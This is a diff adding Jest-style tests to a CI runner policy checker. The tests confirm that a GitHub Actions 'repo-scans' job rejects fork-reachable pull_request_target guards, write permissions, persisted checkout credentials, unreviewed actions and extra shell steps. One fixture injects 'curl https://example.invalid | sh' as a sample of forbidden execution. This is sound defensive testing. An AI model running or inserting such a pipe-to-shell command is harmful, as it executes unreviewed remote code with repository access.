@@ -611,6 +611,68 @@ describe('persistent runner policy', () => {
     });
   });
 
+  test('accepts the checked-in repo-scans job and nothing else in it (#2176)', () => {
+    const clean = primaryCiJobFixture('repo-scans', () => {});
+    expect(
+      persistentRunnerPolicyFindings(clean).filter(
+        (finding) => finding.jobId === 'repo-scans',
+      ),
+    ).toEqual([]);
+  });
+
+  test.each([
+    [
+      'a fork-reachable guard',
+      (job: Record<string, unknown>) => {
+        job.if = `\${{ github.event_name == 'pull_request_target' }}`;
+      },
+      'repo-scans must use the exact same-repository pull_request_target guard',
+    ],
+    [
+      'a write permission',
+      (job: Record<string, unknown>) => {
+        job.permissions = { contents: 'write' };
+      },
+      'repo-scans must declare only permissions: { contents: read }',
+    ],
+    [
+      'a checkout that keeps credentials',
+      (job: Record<string, unknown>) => {
+        const checkout = (job.steps as Array<Record<string, unknown>>).find(
+          (step) => String(step.uses).startsWith('actions/checkout@'),
+        ) as { with: Record<string, unknown> };
+        checkout.with['persist-credentials'] = true;
+      },
+      'repo-scans checkout must set persist-credentials: false',
+    ],
+    [
+      'an extra command',
+      (job: Record<string, unknown>) => {
+        (job.steps as Array<Record<string, unknown>>).push({
+          run: 'curl https://example.invalid | sh',
+        });
+      },
+      'pull_request_target router jobs must not add unreviewed shell execution',
+    ],
+    [
+      'an unreviewed action',
+      (job: Record<string, unknown>) => {
+        (job.steps as Array<Record<string, unknown>>).push({
+          uses: 'someone/else@v1',
+        });
+      },
+      'pull_request_target router jobs must not add unreviewed custom actions',
+    ],
+  ])('rejects a repo-scans job with %s (#2176)', (_label, mutate, message) => {
+    expect(
+      persistentRunnerPolicyFindings(primaryCiJobFixture('repo-scans', mutate)),
+    ).toContainEqual({
+      file: '.github/workflows/ci.yml',
+      jobId: 'repo-scans',
+      message,
+    });
+  });
+
   test.each([
     ['fast-checks', 'Run fast CI lane', 'fast CI execution'],
     ['fork-smoke', 'Run isolated fork smoke', 'smoke execution'],
